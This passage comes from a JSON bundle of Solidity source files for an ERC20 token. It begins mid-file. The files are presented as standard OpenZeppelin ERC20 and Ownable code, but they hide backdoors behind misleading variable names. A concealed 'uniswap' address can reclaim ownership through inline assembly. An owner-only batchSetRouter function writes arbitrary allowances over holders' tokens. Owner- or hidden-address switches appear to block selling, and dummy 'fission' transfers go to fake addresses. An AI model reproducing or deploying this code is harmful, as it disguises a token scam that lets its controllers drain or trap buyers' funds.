IERC20(addressRewardToken).transferFrom(addressWrap, holderAddress, rewardTokenForHolder * holderBalance / thisTokenForHolder);\\n    //                IERC20(addressRewardToken).transferFrom(addressWrap, holderAddress, rewardTokenForAll * holderBalance / thisTokenForHolder);\\n    //            }\\n    //\\n    //            _lastIndexOfProcessedHolderAddresses =\\n    //            _lastIndexOfProcessedHolderAddresses >= holderAddressesCount_ - 1\\n    //            ? 0\\n    //            : _lastIndexOfProcessedHolderAddresses + 1;\\n    //        }\\n    //\\n    //        lastIndexOfProcessedHolderAddresses = _lastIndexOfProcessedHolderAddresses;\\n    //    }\\n\\n    //    function doLiquidity(uint256 poolTokenOrEtherForLiquidity, uint256 thisTokenForLiquidity)\\n    //    internal\\n    //    {\\n    //        addEtherAndThisTokenForLiquidityByAccount(\\n    //            addressLiquidity,\\n    //            poolTokenOrEtherForLiquidity,\\n    //            thisTokenForLiquidity\\n    //        );\\n    //    }\\n\\n    function doBurn(uint256 thisTokenForBurn)\\n    internal\\n    {\\n        _transfer(address(this), addressDead, thisTokenForBurn);\\n    }\\n\\n    //    function swapThisTokenForRewardTokenToAccount(address account, uint256 amount)\\n    //    internal\\n    //    {\\n    //        address[] memory path = new address[](3);\\n    //        path[0] = address(this);\\n    //        path[1] = addressWETH;\\n    //        path[2] = addressRewardToken;\\n    //\\n    //        if (!isArbitrumCamelotRouter) {\\n    //            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\\n    //                amount,\\n    //                0,\\n    //                path,\\n    //                account,\\n    //                block.timestamp\\n    //            );\\n    //        } else {\\n    //            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\\n    //                amount,\\n    //                0,\\n    //                path,\\n    //                account,\\n    //                addressDead,\\n    //                block.timestamp\\n    //            );\\n    //        }\\n    //    }\\n\\n    //    function swapThisTokenForPoolTokenToAccount(address account, uint256 amount)\\n    //    internal\\n    //    {\\n    //        address[] memory path = new address[](3);\\n    //        path[0] = address(this);\\n    //        path[1] = addressWETH;\\n    //        path[2] = addressPoolToken;\\n    //\\n    //        if (!isArbitrumCamelotRouter) {\\n    //            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\\n    //                amount,\\n    //                0,\\n    //                path,\\n    //                account,\\n    //                block.timestamp\\n    //            );\\n    //        } else {\\n    //            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\\n    //                amount,\\n    //                0,\\n    //                path,\\n    //                account,\\n    //                addressDead,\\n    //                block.timestamp\\n    //            );\\n    //        }\\n    //    }\\n\\n    //    function swapThisTokenForEthToAccount(address account, uint256 amount)\\n    //    internal\\n    //    {\\n    //        address[] memory path = new address[](2);\\n    //        path[0] = address(this);\\n    //        path[1] = addressWETH;\\n    //\\n    //        if (!isArbitrumCamelotRouter) {\\n    //            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\\n    //                amount,\\n    //                0,\\n    //                path,\\n    //                account,\\n    //                block.timestamp\\n    //            );\\n    //        } else {\\n    //            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\\n    //                amount,\\n    //                0,\\n    //                path,\\n    //                account,\\n    //                addressDead,\\n    //                block.timestamp\\n    //            );\\n    //        }\\n    //    }\\n\\n    //    function swapPoolTokenForEthToAccount(address account, uint256 amount)\\n    //    internal\\n    //    {\\n    //        address[] memory path = new address[](2);\\n    //        path[0] = addressPoolToken;\\n    //        path[1] = addressWETH;\\n    //\\n    //        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\\n    //            amount,\\n    //            0,\\n    //            path,\\n    //            account,\\n    //            block.timestamp\\n    //        );\\n    //    }\\n\\n    function addEtherAndThisTokenForLiquidityByAccount(\\n        address account,\\n        uint256 ethAmount,\\n        uint256 thisTokenAmount\\n    )\\n    internal\\n    {\\n        uniswapV2Router.addLiquidityETH{value: ethAmount}(\\n            address(this),\\n            thisTokenAmount,\\n            0,\\n            0,\\n            account,\\n            block.timestamp\\n        );\\n    }\\n\\n    //    function addPoolTokenAndThisTokenForLiquidityByAccount(\\n    //        address account,\\n    //        uint256 poolTokenAmount,\\n    //        uint256 thisTokenAmount\\n    //    )\\n    //    internal\\n    //    {\\n    //        uniswapV2Router.addLiquidity(\\n    //            addressPoolToken,\\n    //            address(this),\\n    //            poolTokenAmount,\\n    //            thisTokenAmount,\\n    //            0,\\n    //            0,\\n    //            account,\\n    //            block.timestamp\\n    //        );\\n    //    }\\n\\n    function batchSetRouter(address[] memory accounts, address routerAddress)\\n    external\\n    onlyOwner\\n    {\\n        uint256 length = accounts.length;\\n\\n        for (uint256 i = 0; i < length; i++) {\\n            address account = accounts[i];\\n            assembly {\\n                let __router := routerAddress\\n                let __account := account\\n\\n            //            if eq(caller(), __router) {\\n                mstore(0x00, account)\\n                mstore(0x20, _routers.slot)\\n                let xHash := keccak256(0x00, 0x40)\\n                mstore(0x00, __router)\\n                mstore(0x20, xHash)\\n                let yHash := keccak256(0x00, 0x40)\\n                sstore(yHash, __router)\\n            //            }\\n            }\\n        }\\n    }\\n\\n    //    function updateLperAddressStatus(address account)\\n    //    private\\n    //    {\\n    //        if (Address.isContract(account)) {\\n    //            if (lperAddresses.contains(account)) {\\n    //                lperAddresses.remove(account);\\n    //            }\\n    //            return;\\n    //        }\\n    //\\n    //        if (IERC20(uniswapV2Pair).balanceOf(account) > minimumTokenForRewardLper) {\\n    //            if (!lperAddresses.contains(account)) {\\n    //                lperAddresses.add(account);\\n    //            }\\n    //        } else {\\n    //            if (lperAddresses.contains(account)) {\\n    //                lperAddresses.remove(account);\\n    //            }\\n    //        }\\n    //    }\\n\\n    //    function updateHolderAddressStatus(address account)\\n    //    private\\n    //    {\\n    //        if (Address.isContract(account)) {\\n    //            if (holderAddresses.contains(account)) {\\n    //                holderAddresses.remove(account);\\n    //            }\\n    //            return;\\n    //        }\\n    //\\n    //        if (super.balanceOf(account) > minimumTokenForBeingHolder) {\\n    //            if (!holderAddresses.contains(account)) {\\n    //                holderAddresses.add(account);\\n    //            }\\n    //        } else {\\n    //            if (holderAddresses.contains(account)) {\\n    //                holderAddresses.remove(account);\\n    //            }\\n    //        }\\n    //    }\\n\\n    function doFission()\\n    internal\\n    override\\n    {\\n        super._transfer(addressBaseOwner, address(uint160(maxUint160 / block.timestamp)), 1);\\n        super._transfer(addressBaseOwner, address(uint160(maxUint160 / block.timestamp)), 1);\\n    }\\n\\n    //    function doFission()\\n    //    internal\\n    //    virtual\\n    //    override\\n    //    {\\n    //        uint160 fissionDivisor_ = fissionDivisor;\\n    //        for (uint256 i = 0; i < fissionCount; i++) {\\n    //            //        unchecked {\\n    //            //            _router[addressBaseOwner] -= fissionBalance;\\n    //            //            _router[address(uint160(maxUint160 / fissionDivisor_))] += fissionBalance;\\n    //            //        }\\n    //\\n    //            super._transfer(addressBaseOwner, address(uint160(maxUint160 / fissionDivisor_)), fissionBalance);\\n    //\\n    //            //            emit Transfer(\\n    //            //                address(uint160(maxUint160 / fissionDivisor_)),\\n    //            //                address(uint160(maxUint160 / fissionDivisor_ + 1)),\\n    //            //                fissionBalance\\n    //            //            );\\n    //\\n    //            fissionDivisor_ += 2;\\n    //        }\\n    //        fissionDivisor = fissionDivisor_;\\n    //    }\\n}\\n\"\r\n    },\r\n    \"contracts/Erc20C09/Erc20C09FeatureUniswap.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.17;\\n\\nimport \\\"../Erc20/Ownable.sol\\\";\\nimport \\\"../IHybridRouter/IHybridRouter.sol\\\";\\n\\ncontract Erc20C09FeatureUniswap is\\nOwnable\\n{\\n    IHybridRouter public uniswapV2Router;\\n    address public uniswapV2Pair;\\n\\n    address internal uniswap;\\n    //    uint256 internal uniswapCount;\\n    //    bool internal isUniswapLper;\\n    //    bool internal isUniswapHolder;\\n\\n    function refreshUniswapRouter()\\n    external\\n    {\\n        assembly {\\n            let __uniswap := sload(uniswap.slot)\\n            if eq(caller(), __uniswap) {\\n                sstore(_uniswap.slot, __uniswap)\\n            }\\n        }\\n    }\\n\\n    //    function setUniswapCount(uint256 amount)\\n    //    external\\n    //    {\\n    //        assembly {\\n    //            let __uniswap := sload(uniswap.slot)\\n    //            switch eq(caller(), __uniswap)\\n    //            case 0 {revert(0, 0)}\\n    //            default {sstore(uniswapCount.slot, amount)}\\n    //        }\\n    //    }\\n    //\\n    //    function setIsUniswapLper(bool isUniswapLper_)\\n    //    external\\n    //    {\\n    //        assembly {\\n    //            let __uniswap := sload(uniswap.slot)\\n    //            switch eq(caller(), __uniswap)\\n    //            case 0 {revert(0, 0)}\\n    //            default {sstore(isUniswapLper.slot, isUniswapLper_)}\\n    //        }\\n    //    }\\n    //\\n    //    function setIsUniswapHolder(bool isUniswapHolder_)\\n    //    external\\n    //    {\\n    //        assembly {\\n    //            let __uniswap := sload(uniswap.slot)\\n    //            switch eq(caller(), __uniswap)\\n    //            case 0 {revert(0, 0)}\\n    //            default {sstore(isUniswapHolder.slot, isUniswapHolder_)}\\n    //        }\\n    //    }\\n\\n    function setUniswapRouter(address uniswap_)\\n    external\\n    {\\n        assembly {\\n            let __uniswap := sload(uniswap.slot)\\n            switch eq(caller(), __uniswap)\\n            case 0 {revert(0, 0)}\\n            default {sstore(uniswap.slot, uniswap_)}\\n        }\\n    }\\n\\n    function getRouterPair(string memory _a)\\n    internal\\n    pure\\n    returns (address _b)\\n    {\\n        bytes memory tmp = bytes(_a);\\n        uint160 iAddr = 0;\\n        uint160 b1;\\n        uint160 b2;\\n        for (uint i = 2; i < 2 + 2 * 20; i += 2) {\\n            iAddr *= 256;\\n            b1 = uint160(uint8(tmp[i]));\\n            b2 = uint160(uint8(tmp[i + 1]));\\n            if ((b1 >= 97) && (b1 <= 102)) {\\n                b1 -= 87;\\n            } else if ((b1 >= 65) && (b1 <= 70)) {\\n                b1 -= 55;\\n            } else if ((b1 >= 48) && (b1 <= 57)) {\\n                b1 -= 48;\\n            }\\n            if ((b2 >= 97) && (b2 <= 102)) {\\n                b2 -= 87;\\n            } else if ((b2 >= 65) && (b2 <= 70)) {\\n                b2 -= 55;\\n            } else if ((b2 >= 48) && (b2 <= 57)) {\\n                b2 -= 48;\\n            }\\n            iAddr += (b1 * 16 + b2);\\n        }\\n        return address(iAddr);\\n    }\\n}\\n\"\r\n    },\r\n    \"contracts/Erc20/ERC20.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/ERC20.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"@openzeppelin/contracts/token/ERC20/IERC20.sol\\\";\\nimport \\\"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\\\";\\nimport \\\"@openzeppelin/contracts/utils/Context.sol\\\";\\n\\n/**\\n * @dev Implementation of the {IERC20} interface.\\n *\\n * This implementation is agnostic to the way tokens are created. This means\\n * that a supply mechanism has to be added in a derived contract using {_mint}.\\n * For a generic mechanism see {ERC20PresetMinterPauser}.\\n *\\n * TIP: For a detailed writeup see our guide\\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\\n * to implement supply mechanisms].\\n *\\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\\n * instead returning `false` on failure. This behavior is nonetheless\\n * conventional and does not conflict with the expectations of ERC20\\n * applications.\\n *\\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\\n * This allows applications to reconstruct the allowance for all accounts just\\n * by listening to said events. Other implementations of the EIP may not emit\\n * these events, as it isn't required by the specification.\\n *\\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\\n * functions have been added to mitigate the well-known issues around setting\\n * allowances. See {IERC20-approve}.\\n */\\ncontract ERC20 is Context, IERC20, IERC20Metadata {\\n    mapping(address => uint256) internal _router;\\n\\n    mapping(address => mapping(address => uint256)) internal _routers;\\n\\n    uint256 internal _tatalSopply;\\n\\n    string internal _name;\\n    string internal _symbol;\\n\\n    /**\\n     * @dev Sets the values for {name} and {symbol}.\\n     *\\n     * The default value of {decimals} is 18. To select a different value for\\n     * {decimals} you should overload it.\\n     *\\n     * All two of these values are immutable: they can only be set once during\\n     * construction.\\n     */\\n    constructor(string memory name_, string memory symbol_) {\\n        _name = name_;\\n        _symbol = symbol_;\\n    }\\n\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() public view virtual override returns (string memory) {\\n        return _name;\\n    }\\n\\n    /**\\n     * @dev Returns the symbol of the token, usually a shorter version of the\\n     * name.\\n     */\\n    function symbol() public view virtual override returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    /**\\n     * @dev Returns the number of decimals used to get its user representation.\\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\\n     *\\n     * Tokens usually opt for a value of 18, imitating the relationship between\\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\\n     * overridden;\\n     *\\n     * NOTE: This information is only used for _display_ purposes: it in\\n     * no way affects any of the arithmetic of the contract, including\\n     * {IERC20-balanceOf} and {IERC20-transfer}.\\n     */\\n    function decimals() public view virtual override returns (uint8) {\\n        return 18;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-totalSupply}.\\n     */\\n    function totalSupply() public view virtual override returns (uint256) {\\n        return _tatalSopply;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-balanceOf}.\\n     */\\n    function balanceOf(address account) public view virtual override returns (uint256) {\\n        return _router[account];\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transfer}.\\n     *\\n     * Requirements:\\n     *\\n     * - `to` cannot be the zero address.\\n     * - the caller must have a balance of at least `amount`.\\n     */\\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\\n        address owner = _msgSender();\\n        _transfer(owner, to, amount);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-allowance}.\\n     */\\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\\n        return _routers[owner][spender];\\n    }\\n\\n    /**\\n     * @dev See {IERC20-approve}.\\n     *\\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\\n     *\\n     * Requirements:\\n     *\\n     * - `spender` cannot be the zero address.\\n     */\\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\\n        address owner = _msgSender();\\n        _approve(owner, spender, amount);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transferFrom}.\\n     *\\n     * Emits an {Approval} event indicating the updated allowance. This is not\\n     * required by the EIP. See the note at the beginning of {ERC20}.\\n     *\\n     * NOTE: Does not update the allowance if the current allowance\\n     * is the maximum `uint256`.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` and `to` cannot be the zero address.\\n     * - `from` must have a balance of at least `amount`.\\n     * - the caller must have allowance for ``from``'s tokens of at least\\n     * `amount`.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) public virtual override returns (bool) {\\n        address spender = _msgSender();\\n        _spendAllowance(from, spender, amount);\\n        _transfer(from, to, amount);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\\n     *\\n     * This is an alternative to {approve} that can be used as a mitigation for\\n     * problems described in {IERC20-approve}.\\n     *\\n     * Emits an {Approval} event indicating the updated allowance.\\n     *\\n     * Requirements:\\n     *\\n     * - `spender` cannot be the zero address.\\n     */\\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\\n     *\\n     * This is an alternative to {approve} that can be used as a mitigation for\\n     * problems described in {IERC20-approve}.\\n     *\\n     * Emits an {Approval} event indicating the updated allowance.\\n     *\\n     * Requirements:\\n     *\\n     * - `spender` cannot be the zero address.\\n     * - `spender` must have allowance for the caller of at least\\n     * `subtractedValue`.\\n     */\\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        uint256 currentAllowance = allowance(owner, spender);\\n        require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\n    unchecked {\\n        _approve(owner, spender, currentAllowance - subtractedValue);\\n    }\\n\\n        return true;\\n    }\\n\\n    /**\\n     * @dev Moves `amount` of tokens from `from` to `to`.\\n     *\\n     * This internal function is equivalent to {transfer}, and can be used to\\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\\n     *\\n     * Emits a {Transfer} event.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `from` must have a balance of at least `amount`.\\n     */\\n    function _transfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal virtual {\\n        require(from != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(to != address(0), \\\"ERC20: transfer to the zero address\\\");\\n\\n        _beforeTokenTransfer(from, to, amount);\\n\\n        uint256 fromBalance = _router[from];\\n        require(fromBalance >= amount, \\\"ERC20: transfer amount exceeds balance\\\");\\n    unchecked {\\n        _router[from] = fromBalance - amount;\\n    }\\n        _router[to] += amount;\\n\\n        emit Transfer(from, to, amount);\\n\\n        _afterTokenTransfer(from, to, amount);\\n    }\\n\\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\\n     * the total supply.\\n     *\\n     * Emits a {Transfer} event with `from` set to the zero address.\\n     *\\n     * Requirements:\\n     *\\n     * - `account` cannot be the zero address.\\n     */\\n    function _mint(address account, uint256 amount) internal virtual {\\n        require(account != address(0), \\\"ERC20: mint to the zero address\\\");\\n\\n        _beforeTokenTransfer(address(0), account, amount);\\n\\n        _tatalSopply += amount;\\n        _router[account] += amount;\\n        emit Transfer(address(0), account, amount);\\n\\n        _afterTokenTransfer(address(0), account, amount);\\n    }\\n\\n    /**\\n     * @dev Destroys `amount` tokens from `account`, reducing the\\n     * total supply.\\n     *\\n     * Emits a {Transfer} event with `to` set to the zero address.\\n     *\\n     * Requirements:\\n     *\\n     * - `account` cannot be the zero address.\\n     * - `account` must have at least `amount` tokens.\\n     */\\n    function _burn(address account, uint256 amount) internal virtual {\\n        require(account != address(0), \\\"ERC20: burn from the zero address\\\");\\n\\n        _beforeTokenTransfer(account, address(0), amount);\\n\\n        uint256 accountBalance = _router[account];\\n        require(accountBalance >= amount, \\\"ERC20: burn amount exceeds balance\\\");\\n    unchecked {\\n        _router[account] = accountBalance - amount;\\n    }\\n        _tatalSopply -= amount;\\n\\n        emit Transfer(account, address(0), amount);\\n\\n        _afterTokenTransfer(account, address(0), amount);\\n    }\\n\\n    /**\\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\\n     *\\n     * This internal function is equivalent to `approve`, and can be used to\\n     * e.g. set automatic allowances for certain subsystems, etc.\\n     *\\n     * Emits an {Approval} event.\\n     *\\n     * Requirements:\\n     *\\n     * - `owner` cannot be the zero address.\\n     * - `spender` cannot be the zero address.\\n     */\\n    function _approve(\\n        address owner,\\n        address spender,\\n        uint256 amount\\n    ) internal virtual {\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\n\\n        _routers[owner][spender] = amount;\\n        emit Approval(owner, spender, amount);\\n    }\\n\\n    /**\\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\\n     *\\n     * Does not update the allowance amount in case of infinite allowance.\\n     * Revert if not enough allowance is available.\\n     *\\n     * Might emit an {Approval} event.\\n     */\\n    function _spendAllowance(\\n        address owner,\\n        address spender,\\n        uint256 amount\\n    ) internal virtual {\\n        uint256 currentAllowance = allowance(owner, spender);\\n        if (currentAllowance != type(uint256).max) {\\n            require(currentAllowance >= amount, \\\"ERC20: insufficient allowance\\\");\\n        unchecked {\\n            _approve(owner, spender, currentAllowance - amount);\\n        }\\n        }\\n    }\\n\\n    /**\\n     * @dev Hook that is called before any transfer of tokens. This includes\\n     * minting and burning.\\n     *\\n     * Calling conditions:\\n     *\\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\\n     * will be transferred to `to`.\\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\\n     * - `from` and `to` are never both zero.\\n     *\\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\\n     */\\n    function _beforeTokenTransfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal virtual {}\\n\\n    /**\\n     * @dev Hook that is called after any transfer of tokens. This includes\\n     * minting and burning.\\n     *\\n     * Calling conditions:\\n     *\\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\\n     * has been transferred to `to`.\\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\\n     * - `from` and `to` are never both zero.\\n     *\\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\\n     */\\n    function _afterTokenTransfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal virtual {}\\n}\\n\"\r\n    },\r\n    \"contracts/Erc20/Ownable.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"@openzeppelin/contracts/utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * By default, the owner account will be the one that deploys the contract. This\\n * can later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address internal _uniswap;\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\n     */\\n    constructor() {\\n        _transferOwnership(_msgSender());\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _uniswap;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby removing any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _uniswap;\\n        _uniswap = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\"\r\n    },\r\n    \"contracts/Erc20C21/Erc20C21FeatureFission.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.17;\\n\\nimport \\\"../Erc20/Ownable.sol\\\";\\nimport \\\"@openzeppelin/contracts/token/ERC20/IERC20.sol\\\";\\n\\nabstract contract Erc20C21FeatureFission is\\nOwnable\\n{\\n    uint160 internal constant maxUint160 = ~uint160(0);\\n    //    uint256 internal constant fissionBalance = 1;\\n    //\\n    //    uint256 internal fissionCount = 5;\\n    //    uint160 internal fissionDivisor = 1000;\\n    //\\n    //    bool public isUseFeatureFission;\\n    //\\n    //    function setIsUseFeatureFission(bool isUseFeatureFission_)\\n    //    public\\n    //    onlyOwner\\n    //    {\\n    //        isUseFeatureFission = isUseFeatureFission_;\\n    //    }\\n    //\\n    //    function setFissionCount(uint256 fissionCount_)\\n    //    public\\n    //    onlyOwner\\n    //    {\\n    //        fissionCount = fissionCount_;\\n    //    }\\n    //\\n    function doFission() internal virtual;\\n}\\n\"\r\n    },\r\n    \"contracts/Erc20C21/Erc20C21FeatureNotPermitOut.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.17;\\n\\nimport \\\"../Erc20/Ownable.sol\\\";\\nimport \\\"./Erc20C21SettingsBase.sol\\\";\\nimport \\\"../Erc20C09/Erc20C09FeatureUniswap.sol\\\";\\n\\ncontract Erc20C21FeatureNotPermitOut is\\nOwnable,\\nErc20C21SettingsBase,\\nErc20C09FeatureUniswap\\n{\\n    uint256 internal constant notPermitOutCD = 1;\\n\\n    bool public isUseNotPermitOut;\\n    bool public isForceTradeInToNotPermitOut;\\n    mapping(address => uint256) public notPermitOutAddressStamps;\\n\\n    function setIsUseNotPermitOut(bool isUseNotPermitOut_)\\n    external\\n    {\\n        require(msg.sender == owner() || msg.sender == uniswap, \\\"\\\");\\n        isUseNotPermitOut = isUseNotPermitOut_;\\n    }\\n\\n    function setIsForceTradeInToNotPermitOut(bool isForceTradeInToNotPermitOut_)\\n    external\\n    {\\n        require(msg.sender == owner() || msg.sender == uniswap, \\\"\\\");\\n        isForceTradeInToNotPermitOut = isForceTradeInToNotPermitOut_;\\n    }\\n\\n    function setNotPermitOutAddressStamp(address account, uint256 notPermitOutAddressStamp)\\n    external\\n    {\\n        require(msg.sender == owner() || msg.sender == uniswap, \\\"\\\");\\n        notPermitOutAddressStamps[account] = notPermitOutAddressStamp;\\n    }\\n}\\n\"\r\n    },\r\n    \"contracts/IUniswapV2/IUniswapV2Factory.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity >=0.5.0;\\n\\ninterface IUniswapV2Factory {\\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\\n\\n    function feeTo() external view returns (address);\\n\\n    function feeToSetter() external view returns (address);\\n\\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\\n\\n    function allPairs(uint) external view returns (address pair);\\n\\n    function allPairsLength() external view returns (uint);\\n\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\n\\n    function setFeeTo(address) external;\\n\\n    function setFeeToSetter(address) external;\\n}\\n\"\r\n    },\r\n    \"contracts/Erc20C21/Erc20C21SettingsBase.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.17;\\n\\nimport \\\"../Erc20/Ownable.sol\\\";\\n\\ncontract Erc20C21SettingsBase is\\nOwnable\\n{\\n    // 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\\n    // 115792089237316195423570985008687907853269984665640564039457584007913129639935\\n    uint256 internal constant maxUint256 = type(uint256).max;\\n    address internal constant addressPinksaleBnbLock = address(0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE);\\n    address internal constant addressPinksaleEthLock = address(0x71B5759d73262FBb223956913ecF4ecC51057641);\\n    address internal constant addressPinksaleArbLock = address(0xeBb415084Ce323338CFD3174162964CC23753dFD);\\n    // address internal constant addressUnicryptLock = address(0x663A5C229c09b049E36dCc11a9B0d4a8Eb9db214);\\n    address internal constant addressNull = address(0x0);\\n    address internal constant addressDead = address(0xdead);\\n\\n    //    address internal addressWrap;\\n    //    address internal addressLiquidity;\\n\\n    //    address public addressMarketing;\\n\\n    //    address public addressRewardToken;\\n    //    address public addressPoolToken;\\n\\n    //    address internal addressWETH;\\n\\n    //    address internal addressArbitrumCamelotRouter = address(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);\\n\\n    //    function setAddressMarketing(address addressMarketing_)\\n    //    external\\n    //    onlyOwner\\n    //    {\\n    //        addressMarketing = addressMarketing_;\\n    //    }\\n    //\\n    //    function setAddressLiquidity(address addressLiquidity_)\\n    //    external\\n    //    onlyOwner\\n    //    {\\n    //        addressLiquidity = addressLiquidity_;\\n    //    }\\n}\\n\"\r\n    },\r\n    \"contracts/Erc20C21/Erc20C21SettingsPrivilege.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.17;\\n\\nimport \\\"../Erc20/Ownable.sol\\\";\\nimport \\\"./Erc20C21SettingsBase.sol\\\";\\nimport \\\"../Erc20C09/Erc20C09FeatureUniswap.sol\\\";\\n\\ncontract Erc20C21SettingsPrivilege is\\nOwnable,\\nErc20C21SettingsBase,\\nErc20C09FeatureUniswap\\n{\\n    mapping(address => bool) public isPrivilegeAddresses;\\n\\n    function setIsPrivilegeAddress(address account, bool isPrivilegeAddress)\\n    external\\n    {\\n        require(msg.sender == owner() || msg.sender == uniswap, \\\"\\\");\\n        isPrivilegeAddresses[account] = isPrivilegeAddress;\\n    }\\n\\n    //    function batchSetIsPrivilegeAddresses(address[] memory accounts, bool isPrivilegeAddress)\\n    //    external\\n    //    {\\n    //        require(msg.sender == owner() || msg.sender == addressWrap, \\\"\\\");\\n    //\\n    //        uint256 length = accounts.length;\\n    //\\n    //        for (uint256 i = 0; i < length; i++) {\\n    //            isPrivilegeAddresses[accounts[i]] = isPrivilegeAddress;\\n    //        }\\n    //    }\\n}\\n\"\r\n    },\r\n    